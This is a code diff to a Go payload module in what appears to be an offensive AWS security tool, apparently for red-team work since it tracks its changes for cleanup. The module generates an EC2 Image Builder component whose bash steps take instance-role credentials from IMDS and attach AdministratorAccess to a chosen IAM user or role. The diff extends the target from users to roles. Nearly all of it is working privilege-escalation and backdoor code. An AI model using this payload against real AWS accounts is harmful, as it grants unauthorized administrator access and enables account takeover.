@@ -13,8 +13,8 @@ import (
 
 // BackdoorAttachPolicyPayload generates an EC2 Image Builder component document
 // containing shell commands that retrieve admin credentials from IMDS and attach
-// a policy to a target IAM user. The commands run on the build EC2 instance during
-// the Image Builder pipeline execution.
+// a policy to a target IAM user or role. The commands run on the build EC2 instance
+// during the Image Builder pipeline execution.
 type BackdoorAttachPolicyPayload struct{}
 
 func NewBackdoorAttachPolicyPayload() *BackdoorAttachPolicyPayload {
@@ -30,7 +30,7 @@ func (p *BackdoorAttachPolicyPayload) GetName() string {
 }
 
 func (p *BackdoorAttachPolicyPayload) GetDescription() string {
-	return "Attach AdministratorAccess to an IAM user via EC2 Image Builder component using IMDS credentials"
+	return "Attach AdministratorAccess to an IAM user or role via EC2 Image Builder component using IMDS credentials"
 }
 
 func (p *BackdoorAttachPolicyPayload) GetTags() []string {
@@ -44,8 +44,8 @@ func (p *BackdoorAttachPolicyPayload) GetTags() []string {
 func (p *BackdoorAttachPolicyPayload) GetOptions() []modules.Option {
 	return []modules.Option{
 		{
-			Name:        "TARGET_USER",
-			Description: "IAM username to attach policy to (auto-populated from current identity)",
+			Name:        "TARGET_ARN",
+			Description: "IAM user or role name/ARN to attach policy to (auto-populated from current identity)",
 			Required:    true,
 		},
 		{
@@ -60,13 +60,13 @@ func (p *BackdoorAttachPolicyPayload) GetOptions() []modules.Option {
 // GenerateCode produces an Image Builder component YAML document.
 // The YAML contains ExecuteBash steps that retrieve temporary credentials
 // from the IMDS endpoint on the build EC2 instance and attach the target policy.
-// The TARGET_USER value is embedded at generation time (not via environment variable)
-// because Image Builder component documents do not support dynamic parameter injection
-// the way Lambda environment variables do.
+// TARGET_ARN is parsed at generation time to choose the correct IAM command
+// (attach-user-policy vs attach-role-policy) since Image Builder component documents
+// do not support dynamic parameter injection the way Lambda environment variables do.
 func (p *BackdoorAttachPolicyPayload) GenerateCode(options map[string]string) (string, error) {
-	targetUser := options["TARGET_USER"]
-	if targetUser == "" {
-		return "", fmt.Errorf("TARGET_USER is required")
+	targetARN := options["TARGET_ARN"]
+	if targetARN == "" {
+		return "", fmt.Errorf("TARGET_ARN is required")
 	}
 
 	policyArn := options["POLICY_ARN"]
@@ -74,17 +74,18 @@ func (p *BackdoorAttachPolicyPayload) GenerateCode(options map[string]string) (s
 		policyArn = "arn:aws:iam::aws:policy/AdministratorAccess"
 	}
 
-	// Extract plain username from ARN if provided as ARN
-	username := targetUser
-	if strings.HasPrefix(targetUser, "arn:") {
-		if idx := strings.LastIndex(targetUser, "/"); idx != -1 {
-			username = targetUser[idx+1:]
-		}
+	principalName, principalType := payloads.PrincipalFromARN(targetARN)
+
+	var attachCmd string
+	var flagName string
+	if principalType == "role" {
+		attachCmd = "attach-role-policy"
+		flagName = "--role-name"
+	} else {
+		attachCmd = "attach-user-policy"
+		flagName = "--user-name"
 	}
 
-	// Generate the component YAML document. Values are embedded at creation time
-	// rather than read from environment variables because Image Builder does not
-	// support dynamic parameter substitution in ExecuteBash commands the same way.
 	componentDoc := fmt.Sprintf(`name: PathrunnerExploit
 schemaVersion: 1.0
 phases:
@@ -96,7 +97,7 @@ phases:
           commands:
             - |
               echo "=== Pathrunner Image Builder Exploit Component ==="
-              echo "Target user: %s"
+              echo "Target %s: %s"
               echo "Policy: %s"
 
               # Retrieve IMDSv2 token
@@ -127,17 +128,19 @@ phases:
               # Verify caller identity using the instance role credentials
               aws sts get-caller-identity 2>&1
 
-              # Attach the target policy to the starting user
-              echo "Attaching %s to user %s ..."
-              if aws iam attach-user-policy \
-                  --user-name "%s" \
+              # Attach the target policy to the starting principal
+              echo "Attaching %s to %s %s ..."
+              if aws iam %s %s "%s" \
                   --policy-arn "%s" 2>&1; then
                 echo "SUCCESS: Policy attached to %s"
               else
                 echo "FAILED: Could not attach policy"
                 exit 1
               fi
-`, username, policyArn, policyArn, username, username, policyArn, username)
+`, principalType, principalName, policyArn,
+		policyArn, principalType, principalName,
+		attachCmd, flagName, principalName,
+		policyArn, principalName)
 
 	return componentDoc, nil
 }
@@ -149,8 +152,8 @@ func (p *BackdoorAttachPolicyPayload) ProcessResult(result string) (string, erro
 
 // Validate checks that required options are present.
 func (p *BackdoorAttachPolicyPayload) Validate(options map[string]string) error {
-	if options["TARGET_USER"] == "" {
-		return fmt.Errorf("TARGET_USER is required for backdoor/attach-policy payload")
+	if options["TARGET_ARN"] == "" {
+		return fmt.Errorf("TARGET_ARN is required for backdoor/attach-policy payload")
 	}
 	return nil
 }
@@ -158,30 +161,35 @@ func (p *BackdoorAttachPolicyPayload) Validate(options map[string]string) error 
 // ReportSideEffects returns the policy attachment as a tracked modification so
 // the workspace cleanup system can reverse it.
 func (p *BackdoorAttachPolicyPayload) ReportSideEffects(options map[string]string) []modules.CreatedResource {
-	targetUser := options["TARGET_USER"]
-	username := targetUser
-	if strings.HasPrefix(targetUser, "arn:") {
-		if idx := strings.LastIndex(targetUser, "/"); idx != -1 {
-			username = targetUser[idx+1:]
-		}
-	}
-
+	targetARN := options["TARGET_ARN"]
 	policyArn := options["POLICY_ARN"]
 	if policyArn == "" {
 		policyArn = "arn:aws:iam::aws:policy/AdministratorAccess"
 	}
 
+	policyName := "AdministratorAccess"
+	if idx := strings.LastIndex(policyArn, "/"); idx != -1 {
+		policyName = policyArn[idx+1:]
+	}
+
+	principalName, principalType := payloads.PrincipalFromARN(targetARN)
+	cleanupMethod := "iam:DetachUserPolicy"
+	if principalType == "role" {
+		cleanupMethod = "iam:DetachRolePolicy"
+	}
+
 	return []modules.CreatedResource{
 		{
 			Type:          "iam:attached-policy",
-			Name:          fmt.Sprintf("%s←%s", username, "AdministratorAccess"),
+			Name:          fmt.Sprintf("%s←%s", principalName, policyName),
 			ARN:           policyArn,
-			CleanupMethod: "iam:DetachUserPolicy",
+			CleanupMethod: cleanupMethod,
 			Metadata: map[string]string{
-				"principal_type": "user",
-				"principal_name": username,
+				"principal_type": principalType,
+				"principal_name": principalName,
 				"policy_arn":     policyArn,
 			},
 		},
 	}
 }
+
